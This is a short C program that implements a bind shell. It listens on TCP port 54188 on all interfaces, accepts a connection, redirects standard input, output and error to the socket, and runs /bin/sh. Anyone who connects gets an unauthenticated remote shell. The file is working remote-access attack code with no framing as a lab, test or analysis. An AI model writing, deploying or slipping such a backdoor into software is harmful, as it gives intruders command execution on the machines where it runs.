#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#define PORT 54188
#define BUFFER_SIZE 1024

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    // Create a socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

	int optval = 1; 
	setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)); 

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Listen for connections
    if (listen(server_fd, 5) < 0) {
        perror("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", PORT);

    // Accept a client connection
    client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len);
    if (client_fd < 0) {
        perror("Accept failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Client connected.\n");

    // Fork a child process to handle the shell
    pid_t pid = fork();
    if (pid < 0) {
        perror("Fork failed");
        close(client_fd);
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    if (pid == 0) { // Child process
        // Redirect stdin, stdout, and stderr to the client socket
        dup2(client_fd, STDIN_FILENO);
        dup2(client_fd, STDOUT_FILENO);
        dup2(client_fd, STDERR_FILENO);

        // Close unused file descriptors
        close(client_fd);
        close(server_fd);

        // Execute the shell
        execl("/bin/sh", "sh", NULL);
        // execl("/bin/sh", "sh", "-i",  NULL);

        // If execl fails
        perror("execl failed");
        exit(EXIT_FAILURE);
    } else { // Parent process
        // Wait for the child process to finish
        waitpid(pid, NULL, 0);

        printf("Shell session ended.\n");
        close(client_fd);
    }

    close(server_fd);
    printf("Server closed.\n");
    return 0;
}

